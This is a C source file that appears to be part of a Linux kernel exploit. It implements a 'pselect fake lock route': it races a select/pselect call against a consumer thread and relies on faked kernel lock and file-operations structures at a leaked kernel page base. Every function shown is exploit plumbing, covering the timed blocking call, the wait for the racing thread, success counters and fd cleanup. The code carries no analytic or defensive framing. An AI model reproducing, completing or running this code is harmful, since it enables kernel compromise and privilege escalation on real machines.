static void pselect_call(Glk43499Session *s, struct pselect_route_state *st) {
  errno = 0;
  if (st->compact_route) {
    struct timespec ts = {
      .tv_sec = 0,
      .tv_nsec = (long)s->config.select_timeout_us * 1000,
    };
    st->ret = pselect((int)s->config.select_nfds, &st->in, &st->out, &st->ex,
                      &ts, NULL);
  } else {
    struct timeval timeout = {
      .tv_sec = 0,
      .tv_usec = (suseconds_t)s->config.select_timeout_us,
    };
    st->ret = select((int)s->config.select_nfds, &st->in, &st->out, &st->ex,
                     &timeout);
  }
  st->saved_errno = errno;
}

/** @brief Wait for the consumer to leave inflight and read its counters. */
static void pselect_drain_consumer(Glk43499Session *s,
                                   struct pselect_route_state *st) {
  if (atomic_load(&s->rt.consumer_inflight) != 0) {
    for (uint32_t i = 0;
         i < s->config.pselect_drain_rounds &&
         atomic_load(&s->rt.consumer_inflight) != 0; i++) {
      usleep(s->config.race_poll_us);
    }
    st->consumer_stuck = atomic_load(&s->rt.consumer_inflight) != 0;
  }
  st->calls = atomic_load(&s->rt.consumer_calls);
  st->success = atomic_load(&s->rt.consumer_success);
}

static void pselect_route_wait(Glk43499Session *s,
                               struct pselect_route_state *st) {
  pselect_call(s, st);
  restore_standard_io(st->stdio_backup);
  close_standard_io_backups(st->stdio_backup);
  pr_debug("pselect post-select compact=%d +%.0fms ret=%d\n",
          st->compact_route, fops_elapsed_ms(&st->t0), st->ret);
  atomic_store(&s->rt.punch_consume_go, 0);

  pselect_drain_consumer(s, st);
  pr_debug("pselect returned ret=%d errno=%d calls=%d success=%d delay=%d\n",
          st->ret, st->saved_errno, st->calls, st->success, st->delay_usec);
}

/** @brief Close the timerfd and pipe fds after a clean pselect route. */
static void pselect_close_route_fds(struct pselect_route_state *st) {
  if (st->block_fd >= 0 && st->block_fd != st->pipefd[0]) {
    close(st->block_fd);
  }
  st->block_fd = -1;
  if (st->pipefd[0] >= 0) close(st->pipefd[0]);
  if (st->pipefd[1] >= 0) close(st->pipefd[1]);
  st->pipefd[0] = st->pipefd[1] = -1;
}

static void pselect_route_finish(Glk43499Session *s,
                                 struct pselect_route_state *st) {
  if (st->calls > 0 && st->success > 0) {
    s->rt.route_last_step = 0;
    s->rt.route_last_errno = 0;
  } else {
    s->rt.route_last_step = 33;
    s->rt.route_last_errno = st->saved_errno;
  }

  if (st->consumer_stuck) {
    s->rt.route_last_step = 34;
    pr_error("pselect consumer still inflight; leaking route fds\n");
  } else {
    pselect_close_route_fds(st);
  }

  pr_debug("pselect route done calls=%d success=%d step=%d errno=%d\n",
          st->calls, st->success, s->rt.route_last_step,
          s->rt.route_last_errno);
}

void do_pselect_fake_lock_route(Glk43499Session *s, const GlkWriteRequest *req) {
  Glk43499Runtime *rt = &s->rt;
  if (!rt->page_base || !rt->fake_lock || !rt->fake_fops) {
    s->rt.route_last_step = 30;
    s->rt.route_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             rt->page_base, rt->fake_lock, rt->fake_fops);
    return;
  }

  struct pselect_route_state st;
  pselect_route_state_init(&st);
  if (pselect_route_setup(s, req, &st) != 0) return;
  pselect_route_wait(s, &st);
  pselect_route_finish(s, &st);
}
